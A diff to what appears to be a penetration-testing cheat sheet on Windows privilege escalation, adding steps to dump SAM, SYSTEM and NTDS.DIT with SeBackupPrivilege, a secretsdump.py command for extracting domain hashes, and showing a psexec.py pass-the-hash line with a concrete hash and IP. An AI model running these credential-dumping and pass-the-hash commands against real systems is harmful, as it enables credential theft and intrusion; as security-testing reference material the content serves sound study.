@@ -810,6 +810,8 @@ i686-w64-mingw32-gcc hello.c -static -o hello
 
 # 28. SAM Dump with SeBackupPrivilege
 
+## Dump SAM and SYSTEM
+
 If a compromised user has SeBackupPrivilege and SeRestorePrivilege, the attacker can dump the SAM database used by the LSASS process.
 
 ```
@@ -839,6 +841,14 @@ Then, do pass the hash
 
 ```
 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.113.185.188
+```
+
+## Dump NTDS.DIT and SYSTEM
+
+Link: https://github.com/k4sth4/SeBackupPrivilege
+
+```
+secretsdump.py -system system.hive -ntds ntds.dit LOCAL
 ```
 
 ---
